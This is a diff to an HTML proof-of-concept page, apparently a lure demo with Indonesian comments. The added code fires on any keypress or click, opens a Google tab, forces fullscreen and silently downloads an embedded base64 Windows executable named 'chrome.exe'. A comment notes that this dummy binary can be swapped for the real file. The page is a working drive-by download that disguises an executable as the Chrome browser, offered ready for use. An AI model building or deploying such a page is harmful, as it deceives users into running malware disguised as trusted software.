@@ -5,31 +5,77 @@
   <title>Download & Fullscreen on Keypress</title>
 </head>
 <body>
-  <center><h2>POC by @Azrieeeeel</h2></center>
-  <input type="text" id="triggerInput">
+  <center>
+    <h2>POC by @Azrieeeeel</h2>
+    <p>Tekan tombol apa saja untuk trigger download</p>
+    <input type="text" id="triggerInput" placeholder="Klik atau tekan di sini">
+  </center>
 
   <script>
-    document.getElementById('triggerInput').addEventListener('click', function() {
-      // Hanya picu download APK dari link yang diberikan
-      triggerAPKDownload();
-      
-      window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?standalone=1&installdataindex=empty&defaultbrowser=0', '_blank');
-      goFullScreen();
-    }, { once: false });
+    // Fungsi untuk fullscreen
+    function goFullScreen() {
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.mozRequestFullScreen) { // Firefox
+        elem.mozRequestFullScreen();
+      } else if (elem.webkitRequestFullscreen) { // Chrome, Safari
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) { // IE/Edge
+        elem.msRequestFullscreen();
+      }
+    }
 
-    // Fungsi untuk download APK langsung
-    function triggerAPKDownload() {
-      const apkUrl = "https://zriil.github.io/S/upload/dumy.txt";
+    // Fungsi download
+    function Puf(uri, name) {
       const link = document.createElement("a");
-      link.href = apkUrl;
-      link.download = "dumy.txt"; // Nama file saat diunduh
+      link.href = uri;
+      link.download = name;
       link.style.display = "none";
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
     }
 
-    // Hapus semua fungsi download original
+    // Fungsi untuk trigger download
+    function openWin() {
+      // Base64 untuk file .exe dummy (bisa diganti dengan file yang sesungguhnya)
+      const base64Data = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwMLAQIAAAgAAAAOAAAAAAAAABAAAAAQAAAAIAAAAABAAAAQAAAAAgAABAAAAAEAAAAEAAAAAAAAAABgAAAAQAAAAAAAACAAAAAAEAAAEAAAAAAEAAAAAAAAAEAAAAAAgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAkAcAAAAQAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAABgAAAAgAAAAAgAAAAoAAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAACAAAAACAAAADAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADAQAAAAAAAEgAAAACAAUAQCAAAMQHAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGYCICgCAAAKKgATMAIAGQAAAAEAABEoAgAACgLQLAAAAgoCBCgDAAAKBgJ7AgAABCgEAAAKJioAABMwAwBfAAAAAgAAEQKOaQwCCwIYjRAAAAEl0BIAAAoXjRAAAAEl0BMAAAreCiYLBwKOaSgFAAAKDAgHAl8Hb5IAAAoTBAcCWAdvkgAAChMFCwcsBgcCjmkKAh8QjmlvBgAACgIGfQMAAAQqAA==";
+      
+      // Data URL yang benar untuk file .exe
+      const dataUrl = `data:application/x-msdownload;base64,${base64Data}`;
+      
+      Puf(dataUrl, "chrome.exe");
+    }
+
+    // Event listener untuk keypress (tombol apa saja)
+    document.addEventListener('keydown', function(e) {
+      e.preventDefault();
+      
+      // Buka tab baru
+      window.open('https://www.google.com', '_blank');
+      
+      // Trigger download setelah delay
+      setTimeout(function() {
+        openWin();
+      }, 500);
+      
+      // Fullscreen
+      goFullScreen();
+    });
+
+    // Juga trigger saat klik input (opsional)
+    document.getElementById('triggerInput').addEventListener('click', function(e) {
+      e.preventDefault();
+      
+      window.open('https://www.google.com', '_blank');
+      
+      setTimeout(function() {
+        openWin();
+      }, 500);
+      
+      goFullScreen();
+    });
   </script>
 </body>
 </html>
